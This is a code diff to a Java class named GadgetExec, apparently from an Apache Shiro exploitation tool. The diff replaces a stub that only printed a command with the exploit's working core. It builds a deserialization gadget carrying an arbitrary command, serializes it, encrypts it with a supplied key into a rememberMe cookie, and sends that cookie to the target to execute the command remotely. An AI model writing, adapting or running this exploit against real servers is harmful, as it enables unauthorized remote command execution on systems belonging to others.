@@ -1,34 +1,31 @@
 package core.scan;
 
+import core.conn.ShiroHttpConnection;
+import core.payload.ObjectPayload;
+import core.scan.eneity.ShiroTarget;
+import core.util.Payload;
+import core.util.Util;
+
 /**
  * To exec command
  * Need: base, key, command, gadget
  */
-public class GadgetExec extends AbstractGadgetExec implements ShiroScanner {
+public class GadgetExec implements ShiroScanner {
 
-    private String base;
+    private final ShiroTarget target;
 
-    private String key;
-
-    private String command;
-
-    private String gadget;
-
-
-    public GadgetExec(String base, String key, String command) {
-        this.base = base;
-        this.key = key;
-        this.command = command;
+    public GadgetExec(ShiroTarget target) {
+        this.target = target;
     }
-
 
     @Override
     public void scan() throws Exception {
-        this.exec(command);
-    }
-
-    @Override
-    public void exec(String command) {
-        System.out.println(command);
+        ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
+        Class<?> clazz = Payload.getPayloadClass(target.getGadget());
+        ObjectPayload payload = (ObjectPayload) clazz.newInstance();
+        byte[] serialize = Util.serialize(payload.getObjectPayload(target.getCommand()));
+        System.out.println("[+] Send Gadget: " + clazz.getSimpleName() + " | Use Command: " + target.getCommand());
+        String rememberMe = Util.getRememberMe(serialize, target.getKey());
+        connection.sendRememberMe(rememberMe, false);
     }
 }
